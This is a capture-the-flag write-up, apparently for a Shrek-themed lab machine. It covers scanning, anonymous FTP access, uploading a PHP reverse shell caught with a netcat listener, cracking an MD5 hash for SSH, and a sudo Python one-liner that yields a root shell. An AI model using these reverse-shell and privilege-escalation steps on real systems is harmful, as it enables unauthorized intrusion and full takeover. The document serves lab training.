We start with a scan: **nmap -A -sC ip**
We see an Apache server and an FTP server. It is possible to enter ftp with **user anonymous**, without a password.
![nmap](https://github.com/elias403/Write-up-s/blob/main/images/1.PNG)

Going to the Browser *http://ip_target* we see a default Apache page, there is a comment in the source code.
![browser](https://github.com/elias403/Write-up-s/blob/main/images/2.png)

Using **gobuster**, we discovered a hidden directory, with a file called CALL.txt
![gobuster](https://github.com/elias403/Write-up-s/blob/main/images/3.png)

Now we will go to *FTP*
![ftp, anonymous](https://github.com/elias403/Write-up-s/blob/main/images/4.PNG)

With **ls -la** we see that we can * write to the FTP directory * and that it is the same folder where the CALL.txt file is located.
We can use /usr/share/webshells/php/php-reverse-shell.php
We just need to change the ip and port before uploading to FTP

![php-reverse-shell](https://github.com/elias403/Write-up-s/blob/main/images/5.PNG)

We will send php-reverse-shell.php to the victim via ftp -> ** put xx/php-reverse-shell.php **
![put_php-reverse-shell](https://github.com/elias403/Write-up-s/blob/main/images/6.PNG)

Let's open ¹**nc -lnvp 1234** by listening and go to the ?browser to open ³php-reverse-shell.php
![nc](https://github.com/elias403/Write-up-s/blob/main/images/7.PNG)
![browser](https://github.com/elias403/Write-up-s/blob/main/images/8.PNG)
![conexão](https://github.com/elias403/Write-up-s/blob/main/images/9.PNG)

We found the 1st flag in /home/shrek/user.txt
![flag1](https://github.com/elias403/Write-up-s/blob/main/images/10.PNG)
In / home, we see an important.txt file, pointing to "/.runme.sh"
![runme.sh](https://github.com/elias403/Write-up-s/blob/main/images/11.PNG)

Analyzing ¹hash, it is an MD5, we see that it is possibly the credential for ²SSH and also the secret key
https://www.tunnelsup.com/hash-analyzer/
https://crackstation.net/

![shrek:hash](https://github.com/elias403/Write-up-s/blob/main/images/12.PNG)
![ssh](https://github.com/elias403/Write-up-s/blob/main/images/13.PNG)

By providing sudo -l, we can run python with sudo without a password. Going to https://gtfobins.github.io/gtfobins/python/#sudo, we see a way to get a privileged shell.

![sudo-l](https://github.com/elias403/Write-up-s/blob/main/images/14.PNG)
'''
sudo python -c 'import os; os.system("/bin/sh")'
'''

![root](https://github.com/elias403/Write-up-s/blob/main/images/15.PNG)


